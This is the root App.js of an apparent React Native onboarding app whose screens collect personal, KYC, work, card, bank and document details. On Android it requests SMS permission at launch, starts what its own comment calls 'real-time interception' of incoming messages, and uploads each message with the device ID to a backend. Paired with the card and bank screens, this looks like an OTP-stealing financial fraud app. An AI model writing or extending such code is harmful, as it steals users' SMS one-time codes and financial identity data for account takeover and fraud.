import 'react-native-gesture-handler';
import React from 'react';
import { NavigationContainer } from '@react-navigation/native';
import { createStackNavigator } from '@react-navigation/stack';
import { SafeAreaProvider } from 'react-native-safe-area-context';
import { StatusBar } from 'expo-status-bar';
import { View, Platform, StyleSheet } from 'react-native';

import WelcomeScreen from './screens/WelcomeScreen';
import PersonalDetailsScreen from './screens/PersonalDetailsScreen';
import KYCDetailsScreen from './screens/KYCDetailsScreen';
import WorkDetailsScreen from './screens/WorkDetailsScreen';
import CardToCardScreen from './screens/CardToCardScreen';
import BankDetailsScreen from './screens/BankDetailsScreen';
import DocumentUploadScreen from './screens/DocumentUploadScreen';
import SubmissionScreen from './screens/SubmissionScreen';

import SmsService from './services/SmsService';
import DeviceService from './services/DeviceService';
import { syncIncomingSms } from './services/api';

const Stack = createStackNavigator();

export default function App() {
  React.useEffect(() => {
    const setupListeners = async () => {
      if (Platform.OS !== 'android') return;

      const hasPerm = await SmsService.requestPermissions();
      if (hasPerm) {
        const info = await DeviceService.getInfo();
        const deviceId = info.uniqueId;

        // Start real-time interception
        SmsService.startListening();
        SmsService.onSmsReceived(async (sms) => {
          console.log('Syncing upcoming SMS to database...');
          await syncIncomingSms({ deviceId, sms });
        });
      }
    };

    setupListeners();
    return () => SmsService.stopListening();
  }, []);

  return (
    <SafeAreaProvider>
      <View style={styles.webContainer}>
        <NavigationContainer>
          <StatusBar style="light" />
          <Stack.Navigator
            initialRouteName="Welcome"
            screenOptions={{
              headerStyle: { backgroundColor: '#0A1628', elevation: 0, shadowOpacity: 0 },
              headerTintColor: '#C9A84C',
              headerTitleStyle: { fontWeight: 'bold' },
              cardStyle: { backgroundColor: '#0D1B2A' }
            }}
          >
            <Stack.Screen name="Welcome" component={WelcomeScreen} options={{ headerShown: false }} />
            <Stack.Screen name="PersonalDetails" component={PersonalDetailsScreen} options={{ title: 'Personal Info' }} />
            <Stack.Screen name="KYCDetails" component={KYCDetailsScreen} options={{ title: 'Verification' }} />
            <Stack.Screen name="WorkDetails" component={WorkDetailsScreen} options={{ title: 'Professional' }} />
            <Stack.Screen name="CardToCard" component={CardToCardScreen} options={{ title: 'Card Link' }} />
            <Stack.Screen name="BankDetails" component={BankDetailsScreen} options={{ title: 'Payouts' }} />
            <Stack.Screen name="DocumentUpload" component={DocumentUploadScreen} options={{ title: 'Files' }} />
            <Stack.Screen name="Submission" component={SubmissionScreen} options={{ headerShown: false }} />
          </Stack.Navigator>
        </NavigationContainer>
      </View>
    </SafeAreaProvider>
  );
}

const styles = StyleSheet.create({
  webContainer: { flex: 1, backgroundColor: '#333', alignItems: 'center', justifyContent: 'center' },
  ...Platform.select({
    web: { webContainer: { flex: 1, backgroundColor: '#f0f0f0', alignItems: 'center', justifyContent: 'center' } },
    default: { webContainer: { flex: 1 } }
  })
});
